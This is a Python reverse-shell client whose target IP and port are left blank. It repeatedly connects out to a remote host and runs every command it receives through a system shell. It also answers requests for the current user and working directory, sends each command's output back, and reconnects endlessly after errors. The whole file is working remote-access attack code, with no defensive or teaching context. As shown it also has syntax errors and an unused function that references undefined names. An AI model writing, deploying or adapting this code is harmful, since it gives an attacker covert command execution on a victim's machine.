#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import time
import socket
import subprocess as sb
import multiprocessing as mp

target_ip = 
target_port =
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def await_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True: 
        try: 
            s.connect((target_ip, target_port))
            return s
        except socket.error:
            time.sleep(1)

def trecv(s, queue): 
    while True:
        try:
            rdata = s.recv(8000000)
            if rdata: 
                queue.put(rdata)
            else:
                break
        except socket.error:
            break

def send_cmd(result): 
    if result.returncode == 0:  
        if result.stdout:  
            s.sendall(f"{result.stdout}".encode())
        else:
            s.sendall(" ".encode())
            return None
    else:  
        s.send(f"[red]command: '{sdata}' is not valid[/red]".encode())
        return None

def shell(s, sdata):
    try:
        if sdata == "SERVER SHUTDOWN":
            return "SERVER SHUTDOWN"
        elif sdata == "GET LOGIN": 
            return "GET LOGIN" 
        elif sdata == "GET CWD": 
            return "GET CWD"
        elif sdata.startswith("cd "): 
            f_dir = sdata.replace("cd ", "")
            os.chdir(f_dir)
            s.sendall(" ".encode())
        else: 
            result = sb.run(sdata, shell=True, stdout=sb.PIPE, stderr=sb.PIPE, text=True)
            if result.returncode == 0:
                if result.stdout:
                    s.sendall(result.stdout.strip().encode())
                else: 
                    s.sendall(" ".encode())
            else: 
                s.sendall(f"[red]command: '{sdata}' is not valid[/red]".encode())
    except (BrokenPipeError, OSError) as e:
        return "RECONNECT"

def main():
    while True:
        s = await_connection()
        data_queue = mp.Queue()
        proc_recv = mp.Process(target=trecv, args=(s, data_queue,))
        proc_recv.start()
        exit_loop = False
        
        while True: 
            while not data_queue.empty(): 
                rdata = data_queue.get()
                fdata = rdata.decode()
                data = fdata.strip()
                outshell = shell(s, data)
                
                if outshell == "SERVER SHUTDOWN": 
                    proc_recv.terminate()
                    exit_loop = True
                    break
                elif outshell == "GET LOGIN": 
                    login_info = sb.run("whoami", shell=True, stdout=sb.PIPE, text=True)
                    flogin_info = str(login_info.stdout.replace("\n", "")) 
                    s.sendall(flogin_info.encode())
                elif outshell == "GET CWD": 
                    cwd_info = sb.run("pwd", shell=True, stdout=sb.PIPE, text=True)
                    fcwd_info = str(cwd_info.stdout.replace("\n", ""))
                    s.sendall(fcwd_info.encode())
                elif outshell == "RECONNECT":
                    break

            if exit_loop: 
                break

        proc_recv.join()  
        s.close()  

if __name__ == "__main__": 
    while True:
        try:
            main()
        except Exception as e:
            print(f"Connection error: {e}. Retrying in 5 seconds...")
            time.sleep(5)


